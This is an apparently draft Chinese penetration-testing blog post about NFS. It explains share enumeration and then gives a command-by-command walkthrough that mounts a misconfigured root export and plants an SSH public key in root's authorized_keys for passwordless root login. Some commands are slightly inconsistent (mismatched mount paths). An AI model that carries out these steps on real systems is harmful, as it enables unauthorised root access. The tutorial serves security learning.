---
title: 'NFS文件系统'
date: 2019-01-01
category: '渗透测试'
tags: []
lang: 'zh'
draft: true
---
前几日和腾讯云鼎实验室的大佬们交流，偶然间听到了NFS这个概念，遂研究一波

NFS代表网络文件系统，是一种可以在Unix系统中找到的协议，允许网络上的用户以类似于本地存储的方式访问共享文件夹。现代NFS实现包含防止误导导出的文件夹的功能，但遗留系统中的NFS服务未配置正确，可能会被滥用。

# 概述
在NFS的应用中，本地NFS的客户端应用可以透明地读写位于远端NFS服务器上的文件，就像访问本地文件一样。如今NFS具备了防止被利用导出文件夹的功能，但遗留系统中的NFS服务配置不当，则仍可能遭到恶意攻击者的利用。

# NFS服务

这个服务在 2049 / TCP上运行，
> 2049/tcp open nfs 2-4 (RPC #100003)

> rpcinfo-p IP   

确定主机上是否有任何 mountd 和 NFS 服务运行。

> showmount -e IP

列出导出的文件夹
如果出现/*说明整个内网段都是可以进行共享的

那么如果遇到配置不合理的，怎么去获取共享的文件呢？

可以通过创建一个空的本地文件夹并将共享装载到此文件夹中进行访问。

mkdir  /ceshi/  #ceshi文件为新创建的

mount -t nfs 192.168.xx.xxx:/ /ceshi -onolock

df –h

# 入侵过程

目的：利用nfs服务的共享目录配置漏洞，读取目标主机的/etc/passwd文件
原理：NFS服务配置漏洞，赋予了根目录远程可写权限，导致/root/ssh/authorized_keys可被修改，实现远程ssh无密码登录。
步骤：nmap -p0-65535 192.168.1.3    查看目标主机上nfs服务是否开启，
输入：showmount -e 192.168.1.3,查看指定的远程共享目录列表。
输入：ssh-keygen （一路回车）,生成sa公钥；
输入：mkdir /tmp/tool , 建立tool目录，
输入：mount -t nfs 192.168.1.3:/tmp/tool/   ,   把.1.3的根目录挂载到tool目录下，
输入：cat /root/.ssh/id_rsa.pub >> /tmp/t001/root/.ssh/authorized_keys  ，  把生成的公钥追加到靶机dauthorized_keys目录下，实现ssh免密码登录；
输入：ssh root@192.168.1.3 , 登录进目标主机。
